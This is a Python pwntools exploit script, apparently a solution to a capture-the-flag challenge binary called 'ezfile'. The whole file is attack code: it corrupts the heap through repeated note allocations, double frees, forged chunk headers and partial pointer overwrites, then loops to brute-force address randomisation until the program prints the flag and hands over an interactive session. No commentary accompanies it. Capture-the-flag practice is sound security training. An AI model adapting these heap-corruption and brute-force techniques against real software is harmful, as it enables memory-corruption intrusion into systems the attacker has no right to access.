from pwn import *
def addNote(p, size, content = '\n'):
    p.sendlineafter(">>", str(1))
    p.sendlineafter("note >>", str(size))
    p.sendlineafter("content >>", content)

def deleteNote(p, index):
    p.sendlineafter(">>", str(2))
    p.sendlineafter("delete >>", str(index))

def encryptNode(p, size,seed, index):
    p.sendlineafter(">>", str(3))
    p.sendlineafter("index", str(index))
    p.sendlineafter("size", str(size))
    p.sendlineafter("seed", seed)

try_times = 0
context.log_level = "critical"

while(1):
    try:
        print("try times:%d"%try_times)
        try_times+=1
        context.timeout = 0.2
        p = process("./ezfile")
        p.sendlineafter("name", "koocola")
        for i in range(0, 5):
            addNote(p, 0x10, 'a'*0x10)
        addNote(p, 0x10, p64(0)+p64(0x21))
        addNote(p, 0x10, p64(0)+p64(0x21))
        for i in range(0, 4):
            deleteNote(p, 0)
        addNote(p, 1, '\x80')
        addNote(p, 0x10, 'b'*0x10)
        addNote(p, 0x10, p64(0)+p64(0x91))
        for i in range(0, 8):
            deleteNote(p, 1)
        addNote(p, 0x2, '\x70\xfa')
        deleteNote(p, 0)
        deleteNote(p, 0)
        addNote(p, 1, '\x90')
        addNote(p, 1, '\n')
        addNote(p, 1, '\n')
        addNote(p, 1, '\x03')
        payload = 'flag\x00'+'z'*(0x58-0x5) + bytes.decode(p32(0)*2) + 'x' * 0x8 + '\x47\x51'
        encryptNode(p, len(payload), payload, -1);
        r =  p.recvrepeat()
        print(r)
        if b"flag" in r:
            print(r)
            p.interactive()
        p.close()
    except KeyboardInterrupt as e:
        exit()
    except:
        p.close()
        pass 
